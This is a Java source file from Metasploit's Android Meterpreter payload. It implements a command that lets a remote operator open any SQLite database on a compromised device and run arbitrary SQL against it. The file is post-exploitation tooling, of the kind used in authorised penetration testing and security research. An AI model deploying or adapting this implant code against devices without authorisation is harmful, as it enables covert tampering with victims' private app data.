package com.metasploit.meterpreter.android;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

public class sqlite_write_android implements Command {

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request,
                       TLVPacket response) throws Exception {
        String dbpath = request.getStringValue(sqlite_read_android.TLV_TYPE_SQLITE_NAME);
        String query = request.getStringValue(sqlite_read_android.TLV_TYPE_SQLITE_QUERY);
        SQLiteDatabase db = null;
        try {
            db = SQLiteDatabase.openDatabase(dbpath, null, SQLiteDatabase.OPEN_READWRITE);
            db.beginTransaction();
            db.execSQL(query);
            db.setTransactionSuccessful();
        } catch (SQLiteException e) {
            response.addOverflow(sqlite_read_android.TLV_TYPE_SQLITE_ERROR, e.getMessage());
        } finally {
            if (db != null) {
                db.endTransaction();
                db.close();
            }
        }
        return ERROR_SUCCESS;
    }

}
